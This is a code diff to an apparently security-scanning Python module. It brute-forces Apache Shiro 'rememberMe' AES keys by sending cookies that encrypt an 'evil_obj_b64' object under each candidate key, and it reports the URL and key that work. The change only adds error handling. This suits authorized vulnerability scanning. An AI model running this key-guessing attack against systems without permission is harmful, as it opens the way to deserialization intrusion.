@@ -164,17 +164,22 @@ class Script(BaseScript):
             async with ClientSession() as session:
                 for url in self.get_url_normpath_list(self.url):
                     header = {"Cookie": "rememberMe=123456"}
-                    async with session.get(url=url, headers=header, allow_redirects=False) as res:
-                        if res and 'rememberme=deleteme' in res.headers.get("Set-Cookie", "").lower():
-                            for i in range(0, len(self.keylist)):
-                                for mode in [AES.MODE_CBC, AES.MODE_GCM]:
-                                    cookie = self.get_aes_cipher_cookie(self.evil_obj_b64, self.keylist[i], mode)
-                                    header = {"Cookie": cookie}
-                                    async with session.get(url=url, headers=header, allow_redirects=False) as res:
-                                        if res and 'rememberme=deleteme' not in res.headers.get("Set-Cookie", "").lower():
-                                            cookie = self.get_aes_cipher_cookie(self.evil_obj_b64, 'Th15IsN0tExi5TK3yaaaaa==', mode)
-                                            header = {"Cookie": cookie}
+                    try:
+                        async with session.get(url=url, headers=header, allow_redirects=False) as res:
+                            if res and 'rememberme=deleteme' in res.headers.get("Set-Cookie", "").lower():
+                                for i in range(0, len(self.keylist)):
+                                    for mode in [AES.MODE_CBC, AES.MODE_GCM]:
+                                        cookie = self.get_aes_cipher_cookie(self.evil_obj_b64, self.keylist[i], mode)
+                                        header = {"Cookie": cookie}
+                                        try:
                                             async with session.get(url=url, headers=header, allow_redirects=False) as res:
-                                                if res != None and 'rememberme=deleteme' in res.headers.get("Set-Cookie", "").lower():
-                                                    yield f"{url}   {self.keylist[i]}"
-                                            
+                                                if res and 'rememberme=deleteme' not in res.headers.get("Set-Cookie", "").lower():
+                                                    cookie = self.get_aes_cipher_cookie(self.evil_obj_b64, 'Th15IsN0tExi5TK3yaaaaa==', mode)
+                                                    header = {"Cookie": cookie}
+                                                    async with session.get(url=url, headers=header, allow_redirects=False) as res:
+                                                        if res != None and 'rememberme=deleteme' in res.headers.get("Set-Cookie", "").lower():
+                                                            yield f"{url}   {self.keylist[i]}"
+                                        except:
+                                            pass
+                    except:
+                        pass
